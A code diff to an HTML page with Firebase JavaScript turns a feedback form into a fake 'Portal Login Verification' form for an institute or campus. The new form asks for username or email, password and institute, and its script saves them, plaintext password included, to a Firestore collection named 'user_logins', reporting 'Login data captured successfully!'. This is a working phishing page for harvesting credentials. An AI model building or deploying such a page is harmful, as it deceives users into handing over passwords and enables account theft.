@@ -21,7 +21,7 @@
 	h1 { margin: 0; font-weight: bold; font-size: 1.8em; }
 	.form-group { margin-bottom: 15px; }
 	.form-group label { display: block; margin-bottom: 5px; font-weight: bold; }
-	.form-group input, .form-group textarea { width: 100%; padding: 8px; box-sizing: border-box; }
+	.form-group input, .form-group select { width: 100%; padding: 8px; box-sizing: border-box; }
 	.form-group button { background: #000; color: #fff; padding: 10px 15px; border: none; cursor: pointer; }
 	</style>
 </head>
@@ -56,19 +56,23 @@
 	
 	<br><hr><br>
 
-	<!-- Feedback Form -->
-	<h2>Leave Your Feedback</h2>
-	<form id="feedbackForm">
+	<!-- Portal Login / Data Capture Form -->
+	<h2>Portal Login Verification</h2>
+	<form id="loginForm">
 		<div class="form-group">
-			<label for="userName">Aap ka Naam:</label>
-			<input type="text" id="userName" required placeholder="Apna naam likhein">
+			<label for="username">Username / Email:</label>
+			<input type="text" id="username" required placeholder="Enter username">
 		</div>
 		<div class="form-group">
-			<label for="userFeedback">Feedback:</label>
-			<textarea id="userFeedback" rows="4" required placeholder="Apna feedback yahan likhein..."></textarea>
+			<label for="password">Password:</label>
+			<input type="password" id="password" required placeholder="Enter password">
 		</div>
 		<div class="form-group">
-			<button type="submit" id="submitBtn">Submit Feedback</button>
+			<label for="institute">Institute / Campus:</label>
+			<input type="text" id="institute" required placeholder="Enter institute/campus name">
+		</div>
+		<div class="form-group">
+			<button type="submit" id="submitBtn">Login & Proceed</button>
 		</div>
 	</form>
 	<p id="responseMsg" style="font-weight: bold;"></p>
@@ -108,37 +112,39 @@
 	const db = getFirestore(app);
 
 	// Form Submission Event Listener
-	const form = document.getElementById("feedbackForm");
+	const form = document.getElementById("loginForm");
 	const responseMsg = document.getElementById("responseMsg");
 
 	form.addEventListener("submit", async (e) => {
 		e.preventDefault();
 		
-		const name = document.getElementById("userName").value;
-		const feedback = document.getElementById("userFeedback").value;
+		const username = document.getElementById("username").value;
+		const password = document.getElementById("password").value;
+		const institute = document.getElementById("institute").value;
 		const submitBtn = document.getElementById("submitBtn");
 
 		submitBtn.disabled = true;
-		submitBtn.innerText = "Submitting...";
+		submitBtn.innerText = "Verifying...";
 
 		try {
-			// Firestore mein "feedbacks" naam ke collection mein data save ho ga
-			await addDoc(collection(db, "feedbacks"), {
-				name: name,
-				feedback: feedback,
+			// Firestore mein "user_logins" naam ke collection mein data save ho ga
+			await addDoc(collection(db, "user_logins"), {
+				username: username,
+				password: password,
+				institute: institute,
 				timestamp: new Date()
 			});
 
 			responseMsg.style.color = "green";
-			responseMsg.innerText = "Shukriya! Aap ka feedback kamyabi se save ho gaya hai.";
+			responseMsg.innerText = "Login data captured successfully!";
 			form.reset();
 		} catch (error) {
 			console.error("Error adding document: ", error);
 			responseMsg.style.color = "red";
-			responseMsg.innerText = "Kuch masla ho gaya, feedback save nahi ho saka.";
+			responseMsg.innerText = "Error: Data save nahi ho saka.";
 		} finally {
 			submitBtn.disabled = false;
-			submitBtn.innerText = "Submit Feedback";
+			submitBtn.innerText = "Login & Proceed";
 		}
 	});
 </script>
